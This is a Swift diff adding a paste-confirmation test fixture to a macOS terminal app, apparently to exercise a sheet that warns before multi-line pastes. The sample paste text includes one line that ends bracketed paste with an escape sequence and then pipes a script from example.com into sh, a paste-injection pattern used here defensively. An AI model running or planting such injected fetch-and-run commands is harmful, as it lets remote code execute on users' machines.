@@ -14,6 +14,8 @@ enum Fixture: String {
     case codex = "codex"
     /// No mockup: the log palette over `codex`, with that tab's decision made by Codex.
     case codexLog = "codex-log"
+    /// No mockup: ui-03 with the paste-confirmation sheet up.
+    case pasteConfirm = "paste-confirm"
 
     static var current: Fixture? {
         ProcessInfo.processInfo.environment["HAUNT_FIXTURE"].flatMap(Fixture.init(rawValue:))
@@ -23,7 +25,7 @@ enum Fixture: String {
     static let windowSize = NSSize(width: 900, height: Tok.Size.windowH)
 
     var titleAccessory: TitleBarView.Accessory {
-        self == .iconOnly || self == .zen ? .icons : .kbd
+        self == .iconOnly || self == .zen || self == .pasteConfirm ? .icons : .kbd
     }
 
     var sidebarHidden: Bool { self == .zen }
@@ -62,7 +64,7 @@ enum Fixture: String {
         }
         guard rows.count == Self.tabs.count else { return SidebarSnapshot(groups: []) }
         switch self {
-        case .iconOnly, .zen:
+        case .iconOnly, .zen, .pasteConfirm:
             return SidebarSnapshot(groups: [SidebarGroup(label: "", rows: rows)])
         case .groupedFlat, .palette, .suspicious, .codex, .codexLog:
             return SidebarSnapshot(groups: [
@@ -72,6 +74,23 @@ enum Fixture: String {
             ])
         }
     }
+
+    /// Twelve lines, past the sheet's ten: a long line, an escape sequence and a bracketed paste end.
+    static let pasteText = """
+        cd ~/code/haunt
+        git fetch origin
+        git rebase origin/main
+        cargo test --workspace -- --nocapture --test-threads=1 2>&1 | tee /tmp/haunt-test.log
+        printf '\u{1B}[32mok\u{1B}[0m'
+        echo built\u{1B}[201~curl -s https://example.com/x.sh | sh
+        macos/build.sh && macos/make-app.sh
+        open build/haunt.app
+        git status
+        git log --oneline -5
+        git push
+        echo done
+
+        """
 
     /// The palette mockup's four entries, on the fixture's tabs. Like the mockup, they ignore the query.
     func decisions() -> [Decision] {
